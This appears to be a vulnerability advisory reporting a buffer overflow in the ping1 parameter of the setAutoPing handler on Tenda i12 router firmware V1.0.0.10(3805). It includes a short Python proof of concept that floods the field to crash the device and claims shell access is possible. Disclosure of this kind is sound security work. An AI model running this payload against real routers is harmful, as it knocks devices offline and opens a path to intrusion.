The ping1 parameter in the formSetAutoPing function was found to contain a buffer overflow.
-------------------------------------------------------------------------------------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [i12升级软件](https://www.tenda.com.cn/material/show/102572)

![image](https://github.com/user-attachments/assets/e4f804a8-3aa0-4719-9d8a-b5d40f0d3723)


### Affected version

V1.0.0.10(3805)

### Vulnerability details

`Tenda` Router **i12** V1.0.0.10(3805) was discovered to contain a buffer overflow in the module when handling request.`httpd/goform/setAutoPing`. You can create dos or getshell attacks by building payload

![image](https://github.com/user-attachments/assets/ac773b84-b811-4590-8ed3-c2892c967612)


### poc

This POC can result in a Dos.

```text-plain
import requests

url = "http://192.168.142.100/goform/setAutoPing"

data = {
    "linkEn": "1",
    "ping1": "A" * 1000  
}

response = requests.post(url, data=data)

print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
```

![image](https://github.com/user-attachments/assets/0d721657-ab34-47d3-9fed-1430e6d5c85e)
